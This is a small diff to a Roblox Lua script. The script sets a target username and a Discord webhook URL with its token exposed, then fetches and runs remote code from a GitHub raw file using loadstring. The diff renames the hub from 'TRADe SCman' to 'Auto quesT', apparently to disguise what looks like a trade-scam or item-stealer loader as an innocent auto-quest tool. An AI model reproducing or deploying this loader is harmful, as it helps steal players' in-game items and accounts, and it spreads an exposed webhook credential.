@@ -1,5 +1,5 @@
 _G.Username = "ratatoxi1"
-_G.HubName = "TRADe SCman" 
+_G.HubName = "Auto quesT" 
 _G.WebhookUrl = "https://discord.com/api/webhooks/1095837830175010878/9z1KC_ZRAbLjSHV__-xgqzcyyyAEhJlVGMvoDmYn4Vgylrc9own162zIML8HvHHL9F0z"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
